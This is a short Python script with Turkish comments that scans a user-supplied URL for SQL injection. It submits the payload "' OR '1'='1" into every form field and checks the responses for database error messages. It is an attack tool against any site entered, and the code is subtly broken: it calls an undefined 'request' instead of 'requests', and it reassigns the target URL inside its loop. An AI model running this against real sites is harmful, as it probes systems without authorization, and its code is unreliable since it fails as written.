import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def get_forms(url):
	response = requests.get(url)
	soup = BeautifulSoup(response.content, "html.parser")
	forms = soup.find_all("form")
	return forms

# get_forms fonksiyonu sayesinde belirtilen URL'deki web sayfasında bulunan '<form>' etiketlerini BeautifulSoup kullanarak alır ve liste olarak döndürürüz.

def extract_form_details(form):
	details = {}
	action = form.get("action") #formun verilerini göndereceği hedef URL'yi temsil eder.
	method = form.get("method","get") #formun verilerini göndermek için kullanacağı HTTP yöntemini temsil eder.
	inputs = []
	
	for input_tag in form.find_all("input"):
		input_type = input_tag.get("type") # input alanının türü (passwd,text,checkbox)
		input_name = input_tag.get("name")
		input_value = input_tag.get("value","")
		inputs.append({"type":input_type, "name": input_name, "value":input_value})
		
	details["action"] = action
	details["method"] = method
	details["inputs"] = inputs
	
	return details
	
def is_vulnerable(response):
	errors = ["quoted string not properly terminated","unclosed quotation mark after the character string","you have an error in your sql syntax;"]
	# Sql enjeksiyonu açığının işaretini taşıyan bazı hata mesajları
	for error in errors:
		if error in response.text.lower():
			return True
			
	return False		 
# is_vulnerable fonksiyonu HTTP yanıtı içinde belirli hata mesajlarını kontrol ederek Sql enjeksiyonu açığına işaret edip etmediğini belirler.

def scan_for_sql_injection(url):
	forms = get_forms(url)
	print(f"[+] Detected  {len(forms)} forms on {url}.")
	
	for form in forms:
		form_details = extract_form_details(form)
		url = urljoin(url, form_details["action"])
		data = {}
		
		for input_field in form_details ["inputs"]:
			input_name = input_field["name"]
			input_value = input_field["value"] + "' OR '1'='1"
			data[input_name] = input_value
			
		if form_details["method"].lower() == "post":
			response = request.post(url, data=data)
		else:
			response = request.get(url, params=data)
			
		if is_vulnerable(response):
			print(f"SQL injection vulnerability detected in form at {url}")
		else:
			print(f"No SQL injection vulnerability detected in form at {url}")
			
# Kullanıcadan URL al
target_url = input("Lütfen taramak istediğiniz URL'yi girin: ")
scan_for_sql_injection(target_url)
	
